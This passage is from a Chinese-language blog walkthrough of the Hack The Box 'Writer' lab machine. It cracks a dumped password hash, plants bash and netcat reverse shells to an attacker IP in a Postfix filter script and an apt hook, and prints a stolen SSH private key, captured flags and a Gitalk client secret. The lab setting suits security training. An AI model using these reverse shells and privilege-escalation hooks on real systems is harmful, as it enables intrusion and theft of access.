|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
</code></pre>
<p>æˆåŠŸå¾—åˆ°hashå€¼</p>
<pre><code class="Plain">pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=
</code></pre>
<p>ç„¶åä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶</p>
<p>ä½¿ç”¨johnæˆ–è€…hashcatè¿›è¡Œçˆ†ç ´å³å¯</p>
<pre><code class="Plain">hashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt
</code></pre>
<p>æˆåŠŸå¾—åˆ°ç”¨æˆ·kyleçš„è´¦å·å¯†ç </p>
<pre><code class="Plain">username = kyle
password = marcoantonio
</code></pre>
<p>å’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•</p>
<pre><code class="Plain">kyle@writer:~$ cat user.txt
70dc74ad2b72d9bf163b98822d6222a9
</code></pre>
<p>æˆåŠŸè·å¾—useræƒé™çš„flag ## æƒé™æå‡ å’±ä»¬å‡†å¤‡ä¸¤ä¸ªè„šæœ¬</p>
<pre><code class="Plain">#!/bin/bash
# Localize these.
bash -i &amp;&gt;/dev/tcp/10.10.14.110/4444 0&gt;&amp;1
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from &lt;sysexits.h&gt;
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap &quot;rm -f in.$$&quot; 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat &gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL &quot;$@&quot; &lt;in.$$

exit $?
</code></pre>
<p>è¿™æ˜¯ä¿®æ”¹åŸæ–‡ä»¶<code>/etc/postfix/disclaimer</code>åå¾—åˆ°çš„è„šæœ¬ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œè¯¥é¶æœºæ— æ³•ä½¿ç”¨bashå’Œshè¿›è¡Œåå¼¹shellã€‚å¯ä»¥ä½¿ç”¨pythonæˆ–socatè¿›è¡Œgetshellï¼Œç”±äºæ‡’ï¼Œæˆ‘å°±ä¸ä¿®æ”¹äº†</p>
<p>æŸ¥çœ‹æ–‡ä»¶<code>/etc/postfix/disclaimer_addresses</code>å¾—åˆ°é‚®ç®±<code>kyle@writer.htb</code></p>
<p>ä½¿ç”¨è¯¥é‚®ç®±ç¼–å†™è„šæœ¬</p>
<pre><code class="Plain">import smtplib
host = &#39;127.0.0.1&#39;
port = 25

sender_email = &quot;kyle@writer.htb&quot;
receiver_email = &quot;kyle@writer.htb&quot;
message = &quot;&quot;&quot;\
Subject: Hi there

Test_python_sender.&quot;&quot;&quot;

try:
    server = smtplib.SMTP(host, port)
    server.ehlo()
    server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    print(e)
finally:
    server.quit()
</code></pre>
<p>è¿™æ˜¯å‘é€é‚®ä»¶çš„è„šæœ¬</p>
<p>ä¸Šä¼ åˆ°æœåŠ¡å™¨</p>
<p>ç„¶åä½¿ç”¨ncç›‘å¬ç«¯å£</p>
<pre><code class="Plain">nc -nvlp 4444
</code></pre>
<p>æ‹·è´disclaimeræ–‡ä»¶å¹¶å‘é€é‚®ä»¶</p>
<pre><code class="Plain">cp disclaimer /etc/postfix/disclaimer &amp;&amp; python3 sendmail.py
</code></pre>
<p>æˆåŠŸå¾—åˆ°johnçš„shell</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 44352
bash: cannot set terminal process group (78664): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ whoami&amp;&amp;id
whoami&amp;&amp;id
john
uid=1001(john) gid=1001(john) groups=1001(john)
</code></pre>
<p>å¾—åˆ°johnçš„æƒé™ï¼Œåœ¨<code>/home/john/.ssh/</code>ç›®å½•ä¸‹æ‹¿åˆ°<code>id_rsa</code>æ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°</p>
<pre><code class="Plain">-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>ç»™äºˆæƒé™</p>
<pre><code class="Plain">chmod 600 id_rsa
</code></pre>
<p>ç„¶åä½¿ç”¨sshè¿›è¡Œç™»å½•johnç”¨æˆ·</p>
<pre><code class="Plain">ssh john@10.10.11.101 -i id_rsa
</code></pre>
<p>ç™»å…¥åææƒ &gt; å‚è€ƒè¿æ¥</p>
<blockquote>
<p><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></p>
</blockquote>
<pre><code class="Plain">cd /etc/apt/apt.conf.d

echo &#39;apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 4444 &gt;/tmp/f&quot;};&#39; &gt; exp
</code></pre>
<p>ç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£</p>
<pre><code class="Plain">nc -nvlp 4444
</code></pre>
<p>ç„¶åç­‰ç€rootæ‰§è¡Œè¯¥è„šæœ¬å³å¯ï¼Œå¯èƒ½éœ€è¦ç­‰å‡ åˆ†é’Ÿ</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 41008
/bin/sh: 0: can&#39;t access tty; job control turned off
# whoami &amp;&amp; id
root
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>æˆåŠŸææƒåˆ°root</p>
<pre><code class="Plain"># cat root.txt
3664a02fe4477fdc202e27ec4e29de82
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&title=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&title=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/08/09/Hackthebox%20-%20Previse/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Previse - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/07/25/Hackthebox%20-%20BountyHunter/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">BountyHunter - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&title=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&title=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠWriter - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3aQW6DQAwF0Nz/0qnUXVUx/fZMKmEeqwgSmMfC8dh+veLj/X3kZ96/jqt7Xv3q9YkDAwPjtoz38lgvOvn+mld9HZdUDAyMBzDWQbYXCtchNWcnfwAYGBgYeRBcL7QaTDEwMDB6AXed0iXBtJdWYmBgYFTDZRKae8W7j+/FMTAwbsioNgb+8/MH+xsYGBg3YexsR/NWZe91FFaFgYExmpEPUlRLZj1M0pC4vD8GBsZQRm/cId/WJrB8pKPQKcXAwBjKyMNuntjlDYMcf5kUYmBgDGWcLagloXmHFxXmMDAwRjOq29rqmWrat590YmBgzGPstAGSJC9PNHeei4GBMZWRFNHOtjarDYao2IeBgTGacbZtmZ/pzX1hYGA8k9FrTPZK+TsJYtTlwMDAGMqolu+TNDHBJIW28vgFBgbGOEZ1KTtlsnwznCSUP65iYGA8gNFrGVZDZ69sF8EwMDBGM/L0q/fI/HwvHBfeGQYGxgjGOgnLk7/ePatNBQwMjOcwqmWvPLHLG5y9FmbhMgYGxgjGfvKXB+jqHQqNAQwMjKGMnQ1nL4BWX1be2sTAwJjK6A1S5IWw3qBY+SoGBsZoRm+o4mxxrZoyVsM0BgbGDEZ1ACJP73a+UxgLw8DAeAxjv96+Uz7rBX0MDAyMs8E033xW/wAwMDAwqhvRZIn77YdjARcDA+NWjFPDXnlBv9o2+OO3GBgYoxk7G8hqEb+6DU5IGBgYoxlfgFjHZT7sI1UAAAAASUVORK5CYII=" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
